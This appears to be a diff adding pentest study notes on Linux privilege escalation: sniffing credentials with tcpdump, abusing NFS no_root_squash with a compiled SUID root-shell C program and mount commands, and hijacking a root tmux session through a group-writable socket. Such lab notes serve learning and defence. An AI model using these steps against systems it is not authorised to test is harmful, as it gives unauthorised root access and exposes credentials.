@@ -1836,3 +1836,126 @@ $ ./logrotten -p ./payload /tmp/tmp.log
 ```
 
 ---
+
+# 🛠️ Miscellaneous Privilege Escalation Techniques
+
+## 📡 Passive Traffic Capture
+
+Unprivileged users may capture network traffic if `tcpdump` is installed. This can expose sensitive data such as:
+
+- Cleartext credentials from protocols like HTTP, FTP, POP, IMAP, Telnet, SMTP
+- Credit card numbers, SNMP community strings
+- Hashes (Net-NTLMv2, SMBv2, Kerberos) for offline brute-force attacks
+
+**Tools to analyze captured traffic:**
+- `net-creds`
+- `PCredz`
+
+## 📁 Weak NFS Privileges
+
+NFS (Network File System) allows remote access to shared directories. It operates over TCP/UDP port `2049`.
+
+### 🔍 Discovering NFS Shares
+```bash
+showmount -e <NFS-IP>
+```
+
+**Example Output:**
+```
+Export list for 10.129.2.12:
+/tmp             *
+/var/nfs/general *
+```
+
+### 🔧 NFS Export Options
+| Option         | Description |
+|----------------|-------------|
+| `root_squash`  | Maps root to `nfsnobody`, preventing SUID uploads |
+| `no_root_squash` | Allows remote root to create files as root, enabling SUID binaries |
+
+**Example `/etc/exports`:**
+```
+/var/nfs/general *(rw,no_root_squash)
+/tmp *(rw,no_root_squash)
+```
+
+### 🧪 Exploiting NFS with SUID Binary
+1. Create a shell binary:
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+```
+
+2. Compile and copy to NFS mount:
+```bash
+gcc shell.c -o shell
+sudo mount -t nfs 10.129.2.12:/tmp /mnt
+cp shell /mnt
+chmod u+s /mnt/shell
+```
+
+3. Execute from low-privileged user:
+```bash
+./shell
+id
+```
+
+**Result:**
+```bash
+uid=0(root) gid=0(root) groups=0(root),...
+```
+
+## 🖥️ Hijacking Tmux Sessions
+
+`tmux` allows persistent terminal sessions. If a root session is created with weak permissions, it can be hijacked.
+
+### 🧵 Creating Shared Session
+```bash
+tmux -S /shareds new -s debugsess
+chown root:devs /shareds
+```
+
+### 🔍 Check Running Tmux
+```bash
+ps aux | grep tmux
+```
+
+### 🔐 Check Socket Permissions
+```bash
+ls -la /shareds
+```
+
+**Expected Output:**
+```
+srw-rw---- 1 root devs ...
+```
+
+### 👥 Check Group Membership
+```bash
+id
+```
+
+**Expected Output:**
+```
+groups=...,1011(devs)
+```
+
+### 📥 Attach to Session
+```bash
+tmux -S /shareds
+id
+```
+
+**Result:**
+```bash
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+---
